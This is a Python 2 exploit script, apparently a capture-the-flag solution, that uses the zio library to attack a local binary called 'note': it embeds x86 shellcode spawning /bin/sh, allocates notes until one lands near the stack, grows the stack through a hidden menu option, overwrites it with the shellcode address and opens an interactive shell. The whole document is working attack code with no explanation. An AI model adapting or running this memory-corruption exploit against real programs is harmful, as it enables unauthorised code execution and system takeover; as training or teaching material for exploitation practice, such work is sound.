from zio import *

def create_note(io):
    io.read_until('5. exit')
    io.writeline('1')
    io.read_until('note created. no ')   
    no = io.readline()[0:-1]
    io.read_until('[')
    return (int(no), int(io.read_until(']')[0:-1], 16))
    
def write_note(io, no, payload):
    io.read_until('5. exit')
    io.writeline('2')
    io.read_until('note no?')
    io.writeline(str(no))
    io.read_until('paste your note (MAX : 4096 byte)')
    io.writeline(payload)

def read_note(io, no):
    io.read_until('5. exit')
    io.writeline('3')
    io.read_until('note no?')
    io.writeline(str(no))
    io.read_line()
    return io.read_line()

def delete_note(io, no):
    io.read_until('5. exit')
    io.writeline('4')
    io.read_until('note no?')
    io.writeline(str(no))

def exit_ret(io):
    io.read_until('5. exit')
    io.writeline('5')

def secret(io, payload):
    io.read_until('5. exit')
    io.writeline(str(0x31337))
    io.read_until('this')
    io.writeline(payload)

target  = './note'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

def exp(target):
    io  = zio(target, timeout = 10000, print_read = False, print_write = False)
    mem = create_note(io)
    while mem[1] > 0xf0000000:
        delete_note(io, mem[0])
        mem = create_note(io)
        print hex(mem[1])
    write_note(io, mem[0], shellcode.rjust(0x100, '\x90'))
    
    # stack grow
    for i in range (0, 0x1000):
        secret(io, 'A' * 0x400)
        print i
    
    mem1 = create_note(io)
    while (mem1[1] < 0xffd60000) or (mem[1] > 0xffffd000):
        delete_note(io, mem1[0])
        mem1    = create_note(io)
        note    = read_note(io, mem1[0])
        print "[-] memory address: " + hex(mem1[1])
        print "[-] note: " + note.encode('hex') + '\n'
        if (mem1[1] >= 0xf7ffc000) and (mem1[1] < 0xffd60000):
            if note != '\x0a':
                break
    
    payload = l32(mem[1]) * (0x1000/4-1)
    print '\n-------------find it-------------------'
    print '[+] write to     :   ' + hex(mem1[1])
    print '[+] with payload :   ' + payload.encode('hex')
    write_note(io, mem1[0], payload)
    
    exit_ret(io)
    io.interact()
    io.close()

while True:
    exp(target)
